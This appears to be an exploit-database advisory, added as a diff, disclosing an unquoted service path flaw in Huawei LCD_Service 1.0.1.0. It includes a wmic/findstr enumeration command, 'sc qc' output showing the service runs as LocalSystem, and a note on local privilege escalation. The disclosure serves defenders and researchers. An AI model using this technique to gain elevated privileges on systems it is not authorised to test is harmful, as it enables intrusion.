@@ -1,0 +1,34 @@
+# Exploit Title: Huawei LCD_Service 1.0.1.0 - 'LCD_Service' Unquote Service Path
+# Date: 2020-11-07
+# Exploit Author: Gerardo González
+# Vendor Homepage: https://consumer.huawei.com/mx
+# Software Link: https://consumer.huawei.com/mx
+# Version: 1.0.1.0
+# Tested on: Windows 10 Home Single Language x64 Esp
+
+# Step to discover the unquoted Service:
+
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+# Service info:
+
+Huawei LCD_Service   LCD_Service    C:\Program Files\Huawei\HwLcdEnhancement\LCD_Service.exe     Auto
+
+C:\Users\gerar>sc qc "LCD_Service"
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: LCD_Service
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\Huawei\HwLcdEnhancement\LCD_Service.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Huawei LCD_Service
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+# A successful attempt would require the local user to be able to insert their code in the system root path 
+# undetected by the OS or other security applications where it could potentially be executed during 
+# application startup or reboot. If successful, the local user's code would execute with the elevated 
+# privileges of the application.
